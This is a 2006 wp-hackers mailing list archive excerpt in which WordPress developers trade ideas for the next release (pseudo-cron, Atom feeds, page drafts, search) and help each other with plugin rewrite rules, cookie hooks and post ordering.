> On line 651 of classes.php:
> $orderby = apply_filters('posts_orderby', $orderby);
> You can use that filter to modify the query.

That, or pass `order=ASC`/`order=DESC`...
From elharo at metalab.unc.edu  Thu Feb  2 14:58:13 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Thu Feb  2 14:59:33 2006
Subject: [wp-hackers] Tog on WordPress
Message-ID: <43E21E05.7040406@metalab.unc.edu>

OK, he's not writing specifically about WordPress (at least I don't 
think he is); but what he did write should be required reading for 
anyone producing end-user-facing software such as WordPress:

http://www.asktog.com/columns/069ScottAdamsMeltdown.html

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From mhancock at us.net  Thu Feb  2 16:18:23 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Thu Feb  2 16:19:44 2006
Subject: [wp-hackers] Development for 2.next
References: <43E15349.6060708@boren.nu>
Message-ID: <009d01c62814$4acf62c0$6402a8c0@DELL8600>

From: "Ryan Boren" <ryan@boren.nu>

> A few development ideas for the next release, including proposed
> implementations.
>
> What else?

How about discussing, developing, and implementing the framework to properly
TEST the next release?

Urgently need comments regarding the 'framework' proposed in this article:
http://codex.wordpress.org/Testing/XML-RPC_and_Atom_API

Michael E. Hancock

From mrbrog at gmail.com  Thu Feb  2 16:40:59 2006
From: mrbrog at gmail.com (Mr.Brown)
Date: Thu Feb  2 16:42:16 2006
Subject: [wp-hackers] Update Plugin Rewrite Rules
In-Reply-To: <b3522afe0601150902k7bf8ce2bx@mail.gmail.com>
References: <b3522afe0601140842q6dcfdcddm@mail.gmail.com>
	<ebe43d680601140942q53b6ebc0h@mail.gmail.com>
	<b3522afe0601150902k7bf8ce2bx@mail.gmail.com>
Message-ID: <b3522afe0602020840x4cbbe43fo@mail.gmail.com>

David House wrote:

> I assume you're adding them directly to the .htaccess file. Don't. Use
> $wp_rewrite. http://codex.wordpress.org/Function_Reference/WP_Rewrite
> and the second example on that page should be able to help you.

I'm sorry if I come back on this topic, but I tried to do as you suggested to me
but I wasn' t able to solve. I want to do this: I create a page
template like this

<?php
/*
Template Name: Pics Template
*/
// and so on...
?>

then I create a Page, with this template an with the slug 'pics'
Now instead of using "mysite.com/pics/?file=mypic"
I want to call this page in this way: "mysite.com/pics/mypic/"
and in the template I want to have the $_GET['file'] with value "mypic".

I tried to add rewrite rules as you suggested to me, but while the url
"mysite.com/pics/" displays the new page, the url
"mysite.com/pics/mypic/" redirects me to the home page.

The original rule was
RewriteRule ^pics/([^/]+)/$ /pics/?mypic=$1 [QSA,L]

I added the rules by a plugin (I'm not sure I understood the mechanism):
<?php
function RTS_pics_rewrite($rewrite) {
global $wp_rewrite;
$keytag_token = '%pics%';
$wp_rewrite->add_rewrite_tag($keytag_token, '(.+)', album=');
$keywords_structure = $wp_rewrite->root . "pics/$keytag_token";
$keywords_rewrite = $wp_rewrite->generate_rewrite_rules($keywords_structure);
return ( $rewrite + $keywords_rewrite );
}
add_filter ('rewrite_rules_array', 'RTS_pics_rewrite');
?>
I tried also with
add_filter ('page_rewrite_rules', 'RTS_pics_rewrite'); and
add_filter ('root_rewrite_rules', 'RTS_pics_rewrite');

Any ideas?
Thanks in advance
--
Mr.Brown
From mhancock at us.net  Thu Feb  2 16:47:15 2006
From: mhancock at us.net (Michael E. Hancock)
Date: Thu Feb  2 16:48:32 2006
Subject: [wp-hackers] Simplified Upgrade Process
References: <01da01c6273e$37dc7c10$6402a8c0@DELL8600>
	<43E0D605.6060606@midnightcircus.com>
Message-ID: <012201c62818$52aacfd0$6402a8c0@DELL8600>

From: "Owen Winkler" <ringmaster@midnightcircus.com>
> ... If we're talking about 
> the cache, the upgrade code should be flushing the cache before it 
> starts, so you shouldn't have to do that, either.

Not according to this customer's comment:
http://wordpress.org/support/topic/59307?replies=8#post-318811

Michael E. Hancock
From fuzzygroup at gmail.com  Thu Feb  2 17:13:25 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Thu Feb  2 17:21:07 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <009d01c62814$4acf62c0$6402a8c0@DELL8600>
References: <43E15349.6060708@boren.nu>
	<009d01c62814$4acf62c0$6402a8c0@DELL8600>
Message-ID: <8e1656660602020913k1656144cqbb049a56b4905194@mail.gmail.com>

Better search.  I don't really understand why Search within Wordpress blogs
doesn't seem to work all that well.  Example:

http://www.google.com/search?q=site%3Afuzzyblog.com+money&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls=org.mozilla:en-US:official
(181 hits)

http://fuzzyblog.com/?s=money
(2 hits)

http://blogdigger.com/search.jsp?q=site%3Afuzzyblog.com+money&sortby=date
(17 hits)

Yes they shouldn't be equivalent since Google is indexing N different HTML
views of the same but there aren't ONLY 2 posts I've written with the term
money.

And, yeah, since I'm a search dork I know that even suggesting this means
I'm basically jumping up and down and saying "I'll do it" (to some extent).
But before I take a hit for the team, anyone willing to go off list with me
on the issue so I understand the details before I ante up to the table and
take it on?

Thanks in advance.
Scott

On 2/2/06, Michael E. Hancock <mhancock@us.net> wrote:
>
> From: "Ryan Boren" <ryan@boren.nu>
>
> > A few development ideas for the next release, including proposed
> > implementations.
> >
> > What else?
>
> How about discussing, developing, and implementing the framework to
> properly
> TEST the next release?
>
> Urgently need comments regarding the 'framework' proposed in this article:
> http://codex.wordpress.org/Testing/XML-RPC_and_Atom_API
>
> Michael E. Hancock
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From jonabad at gmail.com  Thu Feb  2 17:25:51 2006
From: jonabad at gmail.com (Jon Abad)
Date: Thu Feb  2 17:27:21 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <8e1656660602020913k1656144cqbb049a56b4905194@mail.gmail.com>
References: <43E15349.6060708@boren.nu>	<009d01c62814$4acf62c0$6402a8c0@DELL8600>
	<8e1656660602020913k1656144cqbb049a56b4905194@mail.gmail.com>
Message-ID: <43E2409F.1070804@gmail.com>

A little TLC for the Plugin Management screen.
Something along the lines of check boxes and "Turn on selected" and 
"turn off selected" would make mass management useful.

It would be nice for upgrading if it also remembered which plugins you 
last had on.

Jon

Scott johnson wrote:
> Better search.  I don't really understand why Search within Wordpress blogs
> doesn't seem to work all that well.  Example:
>
> http://www.google.com/search?q=site%3Afuzzyblog.com+money&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls=org.mozilla:en-US:official
> (181 hits)
>
> http://fuzzyblog.com/?s=money
> (2 hits)
>
> http://blogdigger.com/search.jsp?q=site%3Afuzzyblog.com+money&sortby=date
> (17 hits)
>
> Yes they shouldn't be equivalent since Google is indexing N different HTML
> views of the same but there aren't ONLY 2 posts I've written with the term
> money.
>
> And, yeah, since I'm a search dork I know that even suggesting this means
> I'm basically jumping up and down and saying "I'll do it" (to some extent).
> But before I take a hit for the team, anyone willing to go off list with me
> on the issue so I understand the details before I ante up to the table and
> take it on?
>
> Thanks in advance.
> Scott
>
> On 2/2/06, Michael E. Hancock <mhancock@us.net> wrote:
>   
>> From: "Ryan Boren" <ryan@boren.nu>
>>
>>     
>>> A few development ideas for the next release, including proposed
>>> implementations.
>>>
>>> What else?
>>>       
>> How about discussing, developing, and implementing the framework to
>> properly
>> TEST the next release?
>>
>> Urgently need comments regarding the 'framework' proposed in this article:
>> http://codex.wordpress.org/Testing/XML-RPC_and_Atom_API
>>
>> Michael E. Hancock
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   
From wphackers at jamietalbot.com  Thu Feb  2 17:49:49 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Thu Feb  2 17:51:31 2006
Subject: [wp-hackers] Update Plugin Rewrite Rules
In-Reply-To: <b3522afe0602020840x4cbbe43fo@mail.gmail.com>
References: <b3522afe0601140842q6dcfdcddm@mail.gmail.com>	<ebe43d680601140942q53b6ebc0h@mail.gmail.com>	<b3522afe0601150902k7bf8ce2bx@mail.gmail.com>
	<b3522afe0602020840x4cbbe43fo@mail.gmail.com>
Message-ID: <43E2463D.5010703@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mr.Brown wrote:
> I added the rules by a plugin (I'm not sure I understood the mechanism):
> <?php
> function RTS_pics_rewrite($rewrite) {
> global $wp_rewrite;
> $keytag_token = '%pics%';
> $wp_rewrite->add_rewrite_tag($keytag_token, '(.+)', album=');
> $keywords_structure = $wp_rewrite->root . "pics/$keytag_token";
> $keywords_rewrite = $wp_rewrite->generate_rewrite_rules($keywords_structure);
> return ( $rewrite + $keywords_rewrite );
> }
> add_filter ('rewrite_rules_array', 'RTS_pics_rewrite');
> ?>
> I tried also with
> add_filter ('page_rewrite_rules', 'RTS_pics_rewrite'); and
> add_filter ('root_rewrite_rules', 'RTS_pics_rewrite');

add_filter ('rewrite_rules_array', 'RTS_pics_rewrite');

is correct.

> 
> Any ideas?

have you also added the ability to recognise the %pics% tag you just added, using the query_vars
filter?  You also might want to not use + to join your two arrays together.  Seeing as the rewrite
rules array can be passed by reference you can just add it that way.  Try this and see if it works:

add_filter('query_vars', 'RTS_query_vars');
add_filter('rewrite_rules_array', 'RTS_pics_rewrite');

// Define the language query variable.
function RTS_query_vars($vars)
{
	$vars[] = 'album';
	return $vars;
}

function RTS_pics_rewrite(& $rewrite)
{
	$keytag_token = '%pics%';
	$wp_rewrite->add_rewrite_tag($keytag_token, '(.+)', album=');
	$keywords_structure = $wp_rewrite->root . "pics/$keytag_token";
	$rewrite[] = $wp_rewrite->generate_rewrite_rules($keywords_structure);
}

Hope this helps, or at least gives you a starting point,

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4kY9rovxfShShFARArdMAJ99B+P68knvMgCUk2zLB4VwDifMEwCbBt0E
cCIS9Si7rSto/HWkFwZhNS0=
=5I1y
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Thu Feb  2 17:56:05 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Thu Feb  2 17:57:37 2006
Subject: [wp-hackers] Setting A Cookie
Message-ID: <43E247B5.8040407@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi,

I want to set a cookie dependent on whether a specific query var has been set.  ie, set the cookie
to be 'jamie' if author=jamie appears in the query.  As far as I can tell this can't be done at the
moment.  You can't send a cookie after the headers go out in send_headers().  But, you can't get at
the query_var until parse_request() has been called.  There doesn't seem to be an action in between
that would allow the cookie to be set.

Can anyone think of a way around this?  If not, a new action hook would be nice: 'pre_send_headers'
or 'post_parse_request'.  (That second one might be a little confusing).

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4ke1rovxfShShFARAh/GAJ9trpF7UNtdZMWdG4FBzGkuxdlV7ACfYcCs
3qRKmVnUbmf593T2TCCw9Ns=
=Nf2P
-----END PGP SIGNATURE-----
From dmhouse at gmail.com  Thu Feb  2 18:02:25 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb  2 18:03:44 2006
Subject: [wp-hackers] Setting A Cookie
In-Reply-To: <43E247B5.8040407@jamietalbot.com>
References: <43E247B5.8040407@jamietalbot.com>
Message-ID: <ebe43d680602021002w6e252ff6x@mail.gmail.com>

On 02/02/06, Jamie Talbot <wphackers@jamietalbot.com> wrote:
> There doesn't seem to be an action in between
> that would allow the cookie to be set.

How about parse_query? wp-includes/classes.php:244

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From skeltoac at gmail.com  Thu Feb  2 18:26:48 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb  2 18:28:06 2006
Subject: [wp-hackers] Setting A Cookie
In-Reply-To: <43E247B5.8040407@jamietalbot.com>
References: <43E247B5.8040407@jamietalbot.com>
Message-ID: <e6ec604d0602021026y467b25b6seec0e466461c7ddb@mail.gmail.com>

On 2/2/06, Jamie Talbot <wphackers@jamietalbot.com> wrote:
> You can't send a cookie after the headers go out in send_headers().

You can't? I thought headers weren't actually sent until there was
output, which doesn't usually occur until after template_redirect. I'd
hook to that.

Andy
From dmhouse at gmail.com  Thu Feb  2 18:39:55 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb  2 18:41:54 2006
Subject: [wp-hackers] Setting A Cookie
In-Reply-To: <e6ec604d0602021026y467b25b6seec0e466461c7ddb@mail.gmail.com>
References: <43E247B5.8040407@jamietalbot.com>
	<e6ec604d0602021026y467b25b6seec0e466461c7ddb@mail.gmail.com>
Message-ID: <ebe43d680602021039y64234e4el@mail.gmail.com>

On 02/02/06, Andy Skelton <skeltoac@gmail.com> wrote:
> You can't? I thought headers weren't actually sent until there was
> output, which doesn't usually occur until after template_redirect. I'd
> hook to that.

I'd still go for parse_query. It's the earliest time after all the
query vars have been picked up and parsed. Personal preference I
guess.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From stewart at ugelow.com  Thu Feb  2 19:10:58 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Thu Feb  2 19:12:16 2006
Subject: [wp-hackers] Order by +/- ?
In-Reply-To: <aa74b1910602020643q2ff2aeadi6c6b4436a2dcd136@mail.gmail.com>
References: <1f2ed5cd0602020613n5a828a45x758427b6e214127f@mail.gmail.com>
	<e6ec604d0602020631v529e279ey82966cbd4bec578@mail.gmail.com>
	<aa74b1910602020643q2ff2aeadi6c6b4436a2dcd136@mail.gmail.com>
Message-ID: <7c94a5850602021110y1ba28ad8oab8b10f9faffa414@mail.gmail.com>

> > > Are there currently any method/arguments in place to flip the
> > > chronological (or other) order of items etc returned? i.e. something
> > > that wraps ...ORDER BY ASC/DESC
> >
> > On line 651 of classes.php:
> > $orderby = apply_filters('posts_orderby', $orderby);
> > You can use that filter to modify the query.
>
> That, or pass `order=ASC`/`order=DESC`...

Although passing the order is problematic if you're not using the
mod_rewrite rules.

http://trac.wordpress.org/ticket/2333

--Stewart

--

Stewart Ugelow
www.ugelow.com
From dougal at gunters.org  Thu Feb  2 19:47:07 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Thu Feb  2 19:48:44 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E17050.1010708@midnightcircus.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
Message-ID: <43E261BB.8000406@gunters.org>

Owen Winkler wrote:
> Ryan Boren wrote:
>> What else?
> 
> * Built-in pseudo-cron with matching hooks to go along with future posting.

I'd be in favor of pseudo-cron in the core. It would just be such a 
useful thing. Interesting plugins could arise from hooks like 
'new_hour', 'new_day', 'new_week', 'new_month', and 'new_year', among 
other ideas.

> * Atom 1.0/Feed Engine.

+1. Atom 0.3 was deprecated before we released 2.0. We really need to go 
ahead and add a proper Atom 1.0 feed.

> * Implement Atom *commenting/posting* API.

+1. However, unless the specs have changed a lot from last time I 
looked, this might be problematic. From what I saw, the posting API 
required the use of the PUT and DELETE HTTP verbs, in addition to the 
usual GET and POST. PUT is supported in most places, but *many* server 
configurations don't support HTTP DELETE out of the box. So unless 
there's an alternate method in the specs, this might only be doable on a 
limited number of web servers.

> * Rework comments to use API (with new filtering hooks!) instead of 
> direct queries.

+1. And also +1 for comment meta.

> * Rework categories to use API (with new filtering hooks!) instead of 
> direct queries.

+1. We should have category meta, as well. Oh, and to be complete, there 
should be link meta for the link manager.

> * Include vital notices ("Upgrade available!", "Security release 
> available!"), customize the feeds, and add more plugin hooks to the 
> Dashboard.

+1 for upgrade notices. But rather than checking every time you visit 
the dashboard, I'd suggest either using a "Check for updates" button, or 
a weekly pseudo-cron (see, a use case!).

> * Better/new default theme - something more easily customized by casual 
> HTML coders.

Yes, more "official" default themes. Or one really cool, mega-flexible, 
backend-configurable one. "Sidebar1: left/right/none", "Sidebar2: 
left/right/none", "Footer: yes/no", "Archive links: 
Sidebar1/Sidebar2/none", "Choose a header graphic", etc. With separate 
settings for the single template. Pipe dream?

> * Improved post/page search functionality.

Global and run-time configuration allowing searching of pages and 
comments in addition to posts. A simple recursive descent parser for 
boolean logic searches would be pretty cool. "(boot .or. saddle) .and. 
horse". I guess that could be a plugin, if we have the right API hooks.

> * Extend themes to the login page, add login hardening (3 strikes, etc.)

Yes, allowing themes to have their own login.php and register.php would 
be nice.

Also, pluggable error pages. When MySQL dies, we could check for a 
constant in wp-config.php that defines a user-defined error page to 
display instead of our usual "Error establishing database connection" 
message.

> * Produce fudge swirl ice cream.

Fudge swirl might be a good start. But I think our eventual goal should 
be to produce Rocky Road and Tutti Frutti.

-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From mikea at turbonet.com  Thu Feb  2 20:01:03 2006
From: mikea at turbonet.com (Michael D. Adams)
Date: Thu Feb  2 20:02:23 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <Pine.GSO.4.58.0602021158380.16374@clyde>

> A few development ideas for the next release, including proposed
> implementations.
>
> * Support page drafts.
>
> Bust "static" out of post_status and into post_type.  Add a "post"
> post_type.   Reserve post_status for actual status (public, private, draft).

+1 Clarity and meaning in DB columns.

Michael
From fuzzygroup at gmail.com  Thu Feb  2 20:13:19 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Thu Feb  2 20:14:39 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <Pine.GSO.4.58.0602021158380.16374@clyde>
References: <43E15349.6060708@boren.nu>
	<Pine.GSO.4.58.0602021158380.16374@clyde>
Message-ID: <8e1656660602021213s7f9ee7b9qe75e0857a166cdd8@mail.gmail.com>

+1 also.  The lack of status on pages versus posts makes my brain hurt.

S

On 2/2/06, Michael D. Adams <mikea@turbonet.com> wrote:
>
> > A few development ideas for the next release, including proposed
> > implementations.
> >
> > * Support page drafts.
> >
> > Bust "static" out of post_status and into post_type.  Add a "post"
> > post_type.   Reserve post_status for actual status (public, private,
> draft).
>
> +1 Clarity and meaning in DB columns.
>
> Michael
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From mailinglists at yournextbroker.com  Thu Feb  2 20:18:51 2006
From: mailinglists at yournextbroker.com (Eric Hochberger)
Date: Thu Feb  2 20:20:13 2006
Subject: [wp-hackers] Help for Plugin Noob
In-Reply-To: <43DB3C6A.4050307@jamietalbot.com>
References: <D70E2560-9CB1-4A70-87E9-33F23F28D6E9@yournextbroker.com>
	<43DB3C6A.4050307@jamietalbot.com>
Message-ID: <F43FD915-8179-4597-999C-2A2D2F6C3BAD@yournextbroker.com>

Jamie,

Wow so that did reveal one problem -- there's already a /directory/?$  
rewrite.  I've changed mine to /resources/

However, I tried dumping the entire rules array and I don't even see  
my new rule I added.  Any idea why it would not be adding my rule?

Thanks,
Eric

On Jan 28, 2006, at 4:42 AM, Jamie Talbot wrote:

> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Eric Hochberger wrote:
>> Hey guys,
>>
>> Also, when I type in the query ?ld_home=1, the template does load  
>> correctly.  It's just the mod
>> rewrite that is not working.
>>
>> Code to at the bottom:
>>
>> Thanks, Eric
>
>> function ld_rewrite_rules($old_rules) {
>> $my_rules['directory/'] = '/index.php?ld_home=1';
>>
>> return array_merge($my_rules, $old_rules); }
>> add_filter('rewrite_rules_array','ld_rewrite_rules');
>
>
> Have you tried dumping out the rewrite rules to check the order  
> that they are being applied in?
>
> You can print_r the result of your array_merge() to check that  
> they're in the correct order.
>
> Also, you could try this:
>
> echo "Match: " ; print_r($match);
>
> after the line $this->matched= $match; in classes.php on or about  
> line 1545.
>
> Which will tell you what rule is being matched.  That might give  
> you a bit more information to help
> you debug.
>
> Cheers,
>
> Jamie.
>
> - --
> http://jamietalbot.com
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.2.5 (MingW32)
> Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org
>
> iD8DBQFD2zxqrovxfShShFARAikDAKCAPUfk7mHS6p5ziEE94Yhp9vUsxQCfSnfo
> 5VcFcVpjVbqtQwEBm4+fqfY=
> =p8A1
> -----END PGP SIGNATURE-----
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From steagl at people.it  Thu Feb  2 20:34:05 2006
From: steagl at people.it (Stefano)
Date: Thu Feb  2 20:35:34 2006
Subject: [wp-hackers] Development for 2.next
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
Message-ID: <vtq4u1l5dn25glj445ip3d8g416o3iq572@4ax.com>

Il Thu, 02 Feb 2006 14:47:07 -0500, Dougal Campbell
<dougal@gunters.org> scrive:

>> * Include vital notices ("Upgrade available!", "Security release 
>> available!"), customize the feeds, and add more plugin hooks to the 
>> Dashboard.
>
>+1 for upgrade notices. But rather than checking every time you visit 
>the dashboard, I'd suggest either using a "Check for updates" button, or 
>a weekly pseudo-cron (see, a use case!).

+1 for the idea to have it a pseudo-cron.

>> * Better/new default theme - something more easily customized by casual 
>> HTML coders.
>
>Yes, more "official" default themes. Or one really cool, mega-flexible, 
>backend-configurable one. "Sidebar1: left/right/none", "Sidebar2: 
>left/right/none", "Footer: yes/no", "Archive links: 
>Sidebar1/Sidebar2/none", "Choose a header graphic", etc. With separate 
>settings for the single template. Pipe dream?

SOund quite similar a Them i'm working on, with for example space in
Admin Panle to insert the plugins tags and let them shw up without
need to edit core file of the theme, random images in header, bloglogo
fi present, author pict and bio, show calendar or not, programmable
menu and some other stuff. Acytualliy I used Ozh's Theme Toolkit but
planning to switch to self made controla panel for localization
problems.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From mrbrog at gmail.com  Thu Feb  2 22:39:05 2006
From: mrbrog at gmail.com (Mr.Brown)
Date: Thu Feb  2 22:40:23 2006
Subject: [wp-hackers] Update Plugin Rewrite Rules
In-Reply-To: <43E2463D.5010703@jamietalbot.com>
References: <b3522afe0601140842q6dcfdcddm@mail.gmail.com>
	<ebe43d680601140942q53b6ebc0h@mail.gmail.com>
	<b3522afe0601150902k7bf8ce2bx@mail.gmail.com>
	<b3522afe0602020840x4cbbe43fo@mail.gmail.com>
	<43E2463D.5010703@jamietalbot.com>
Message-ID: <b3522afe0602021439k3693a815x@mail.gmail.com>

Jamie Talbot wrote

[cut]

>  Try this and see if it works:
>
> add_filter('query_vars', 'RTS_query_vars');
> add_filter('rewrite_rules_array', 'RTS_pics_rewrite');
>
> // Define the language query variable.
> function RTS_query_vars($vars)
> {
>         $vars[] = 'album';
>         return $vars;
> }
>
> function RTS_pics_rewrite(& $rewrite)
> {
>         $keytag_token = '%pics%';
>         $wp_rewrite->add_rewrite_tag($keytag_token, '(.+)', album=');
>         $keywords_structure = $wp_rewrite->root . "pics/$keytag_token";
>         $rewrite[] = $wp_rewrite->generate_rewrite_rules($keywords_structure);
> }
>
> Hope this helps, or at least gives you a starting point,

Thanks for the answer, but unfortunately it doesn't work. At this
point I have no ideas... I tried also the other example on the Codex
:-(

I try to semplify the question: it is possible in 2.0.1 to pass a
variable to a Page in this way
mysite.com/page-slug/var/ ???
It is possible using rewrite rules? And in which way it is possible?

Thanks again
Mr.Brown
From pete.prodoehl at cygnusinteractive.com  Thu Feb  2 22:48:50 2006
From: pete.prodoehl at cygnusinteractive.com (Pete Prodoehl)
Date: Thu Feb  2 22:50:09 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E261BB.8000406@gunters.org>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
Message-ID: <43E28C52.90307@cygnusinteractive.com>



Dougal Campbell wrote:
> Owen Winkler wrote:
>> Ryan Boren wrote:
>>> What else?
>>
>> * Built-in pseudo-cron with matching hooks to go along with future 
>> posting.
> 
> I'd be in favor of pseudo-cron in the core. It would just be such a 
> useful thing. Interesting plugins could arise from hooks like 
> 'new_hour', 'new_day', 'new_week', 'new_month', and 'new_year', among 
> other ideas.

Hasn't Drupal had a cron-like thing forever? Any Drupal hackers here? 
Would it be worth looking at what they did?


Pete


From fuzzygroup at gmail.com  Thu Feb  2 23:16:42 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Thu Feb  2 23:18:03 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E28C52.90307@cygnusinteractive.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
Message-ID: <8e1656660602021516s5a63c848u9749f03d65d9ca75@mail.gmail.com>

I used to hack on drupal and, yes, they do have it.  As a general rule of
thumb the Drupal project's code is *excellent*.  The overall product is too
complex (imho; send flames to /dev/null) but the code quality is great.  I
respect those guys deeply.

If I need to "borrow" code for a project they are often where I turn
honestly.

S

On 2/2/06, Pete Prodoehl <pete.prodoehl@cygnusinteractive.com> wrote:
>
>
>
> Dougal Campbell wrote:
> > Owen Winkler wrote:
> >> Ryan Boren wrote:
> >>> What else?
> >>
> >> * Built-in pseudo-cron with matching hooks to go along with future
> >> posting.
> >
> > I'd be in favor of pseudo-cron in the core. It would just be such a
> > useful thing. Interesting plugins could arise from hooks like
> > 'new_hour', 'new_day', 'new_week', 'new_month', and 'new_year', among
> > other ideas.
>
> Hasn't Drupal had a cron-like thing forever? Any Drupal hackers here?
> Would it be worth looking at what they did?
>
>
> Pete
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From dstewart at atl.lmco.com  Fri Feb  3 00:04:21 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Feb  3 00:05:53 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E28C52.90307@cygnusinteractive.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
Message-ID: <43E29E05.1050601@atl.lmco.com>

Pete Prodoehl wrote:
> Hasn't Drupal had a cron-like thing forever? Any Drupal hackers here? 
> Would it be worth looking at what they did?

Yes, they do.  It's called "cron.php" and you (wait for it) set up a 
cron job to run it at regular intervals.

Not quite what we're looking for here, IMNSHO.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From nuclearmoose at gmail.com  Fri Feb  3 00:14:48 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb  3 00:16:08 2006
Subject: [wp-hackers] Tog on WordPress
In-Reply-To: <43E21E05.7040406@metalab.unc.edu>
References: <43E21E05.7040406@metalab.unc.edu>
Message-ID: <5aa3aa0602021614p83d345bta9c0d28b4cf9227@mail.gmail.com>

A fantastic read, Elliotte; thanks for posting the link. Testing is one
thing I think the WP community can do better than it currently does.
From fuzzygroup at gmail.com  Fri Feb  3 00:15:16 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Fri Feb  3 00:16:37 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E29E05.1050601@atl.lmco.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
Message-ID: <8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>

*chuckle*  That sounds right.  It also sounds a lot like Kjartan's work if I
had to guess.

One approach that's tricky to pull of but I've seen before is to leverage
existing click stream traffic i.e. people reading your blog to trigger the
"cron".  Given that most wordpress blogs have feeds - or are being crawled
by google, etc there should be more than enough traffic to manage this if
there's a hook into the raw traffic stream (I still qualify is noob so I
can't say if there is such a hook or not).

That said this isn't the type of coding that I do well and I'd likely screw
it up if I was to do it so I'm not volunteering for this.

I do think that this type of "psuedo cron" approach would work well and be
very generically useful.

Scott

On 2/2/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
>
> Pete Prodoehl wrote:
> > Hasn't Drupal had a cron-like thing forever? Any Drupal hackers here?
> > Would it be worth looking at what they did?
>
> Yes, they do.  It's called "cron.php" and you (wait for it) set up a
> cron job to run it at regular intervals.
>
> Not quite what we're looking for here, IMNSHO.
>
> --
> ----------
> Doug Stewart
> Systems Administrator/Web Applications Developer
> Lockheed Martin Advanced Technology Labs
